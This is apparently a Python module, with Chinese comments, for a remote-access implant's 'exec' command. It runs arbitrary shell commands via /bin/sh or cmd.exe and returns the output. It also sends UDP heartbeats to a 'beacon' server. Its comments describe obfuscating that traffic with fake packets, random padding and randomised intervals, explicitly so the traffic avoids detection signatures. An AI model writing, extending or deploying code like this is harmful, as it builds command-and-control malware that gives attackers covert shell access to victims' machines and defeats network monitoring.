"""
@module: exec
@desc: 执行系统命令，两种格式：
  1) exec `命令` <超时>   — 反引号包裹命令，超时支持 300(秒) 300m(分) 3h(时)
  2) exec 直接加命令      — 无超时，一直运行到自然结束
"""
import re
import subprocess

MODULE = {
    "desc": "执行系统命令（`cmd` 超时 模式 或 直接命令 模式，无超时则一直运行）",
    "params": [("cmd", "rest；`命令` 超时(300/300m/3h) 或 直接写命令")],
}

# 超时单位 → 秒
_UNIT_SEC = {"s": 1, "m": 60, "h": 3600}


def _parse_timeout(tok: str):
    """解析超时 token: 300 / 300s / 300m / 3h → 秒; 非法返回 None。"""
    m = re.match(r"^(\d+)([smh]?)$", tok.strip().lower())
    if not m:
        return None
    n = int(m.group(1))
    unit = m.group(2) or "s"
    return n * _UNIT_SEC[unit]


def _parse_cmd(s: str):
    """解析命令串。支持:
      `cmd` [timeout]  → (cmd, timeout秒 或 None, 错误或 "")
      直接命令          → (原样, None, "")
    反引号未闭合/超时非法时返回错误信息(不执行)。
    """
    s = s.strip()
    if s.startswith("`"):
        end = s.find("`", 1)
        if end == -1:
            return s, None, "(exec: 命令反引号未闭合, 应为 `命令` 超时 或 直接写命令)"
        cmd = s[1:end].strip()
        if not cmd:
            return s, None, "(exec: 反引号内命令为空)"
        rest = s[end + 1:].strip()
        if rest:
            tok = rest.split()[0]
            secs = _parse_timeout(tok)
            if secs is None:
                return s, None, \
                    f"(exec: 超时格式无效: {tok!r}, 支持 300/300s/300m/3h)"
            # 反引号后多余 token(超出超时)不允许,防误把命令追加进超时
            if rest.split()[1:]:
                return s, None, \
                    "(exec: 超时后不能跟额外参数," \
                    " 命令需整体放在反引号内)"
            return cmd, secs, ""
        return cmd, None, ""
    return s, None, ""


def _hb_start():
    """长任务心跳：每 30s 向 server 的 UDP 同端口发心跳（21）。

    防长任务期间 server 端 show 误判离线；依赖 beacon 全局 _D/_H/_P。
    """
    global _hb_go, _hb_stop_ev
    if _hb_go:
        return
    try:
        import socket as _s
        import threading as _th
        _hb_go = True
        _hb_stop_ev = _th.Event()

        def _beat():
            try:
                import hmac as _hm
                import hashlib as _hl
                u = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
                u.settimeout(2)
                while not _hb_stop_ev.is_set():
                    try:
                        # M4：心跳带 HMAC(_K, bid) 前 8 字节，防伪造刷新
                        mac = _hm.new(_K, _D.encode(), _hl.sha256).digest()[:8]
                        # 流量混淆: 30% 假心跳(纯随机字节,服务端 MAC 校验失败
                        # 忽略) + 真心跳随机填充 0-40B → 线上包 24-64B 随机大小
                        # (mac 必须保持在帧尾——服务端按 <bid 16><mac 8> 最后 8B 解析)
                        if rnd.random() < 0.3:
                            u.sendto(sec.token_bytes(rnd.randint(24, 64)),
                                     (_H, _P))
                        else:
                            pad = sec.token_bytes(rnd.randint(0, 40))
                            u.sendto(_D.encode() + pad + mac, (_H, _P))
                    except OSError:
                        pass
                    # 间隔随机 10-50s(原固定 30s,固定周期是 UDP 检测特征)
                    _hb_stop_ev.wait(rnd.uniform(10, 50))
                u.close()
            except Exception:
                pass

        _th.Thread(target=_beat, daemon=True).start()
    except Exception:
        pass


def _hb_stop():
    global _hb_go
    try:
        _hb_stop_ev.set()
    except NameError:
        pass
    _hb_go = False


_hb_go = False


def _run(argv, cmd, timeout=None):
    _hb_start()
    proc = None
    try:
        proc = subprocess.Popen(
            argv,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        if timeout:
            try:
                out, _ = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                return f"(timeout after {timeout}s)"
        else:
            # 无超时: 命令一直跑到自然结束
            out, _ = proc.communicate()
        return out.strip() or "(no output)"
    except FileNotFoundError:
        return "(shell not found)"
    except Exception as e:
        return f"(error: {e})"
    finally:
        if proc is not None and proc.poll() is None:
            try:
                proc.kill()
            except OSError:
                pass
        _hb_stop()


def run(cmd):
    """通用入口（平台未知时自动判定）。"""
    cmd2, secs, err = _parse_cmd(cmd)
    if err:
        return err
    import os
    if os.name == "nt":
        return run_windows(cmd2, secs)
    return run_linux(cmd2, secs)


def run_linux(cmd, timeout=None):
    """通过 /bin/sh 执行命令"""
    return _run(["/bin/sh", "-c", cmd], cmd, timeout)


def run_windows(cmd, timeout=None):
    """通过 cmd.exe 执行命令"""
    return _run(["cmd.exe", "/c", cmd], cmd, timeout)


def run_mac(cmd, timeout=None):
    """通过 /bin/sh 执行命令 (macOS)"""
    return _run(["/bin/sh", "-c", cmd], cmd, timeout)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("usage: exec <command> | exec `command` [timeout]")
        sys.exit(1)
    print(f"$ {sys.argv[1]}")
    print(run(sys.argv[1]))
